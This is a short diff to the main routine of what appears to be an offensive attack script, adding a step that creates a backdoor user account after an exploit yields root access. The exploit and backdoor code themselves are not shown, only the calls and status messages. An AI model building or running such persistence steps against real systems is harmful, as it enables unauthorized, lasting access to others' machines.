@@ -225,7 +225,15 @@ def main():
                 print("#    6. Downloading and executing the exploit...")
                 print("############################################################################")
                 ec.sendCommand()
-                ec.exploitTarget()
+                priv_esc = ec.exploitTarget()
+                if priv_esc == 'root':
+                    print("############################################################################")
+                    print("#    7. Creating user backdoor...")
+                    print("############################################################################")
+                    ec.createUser()
+                    pass
+                else:
+                    pass
             else:
                 print("No shell session opened!")
                 print("############################################################################")
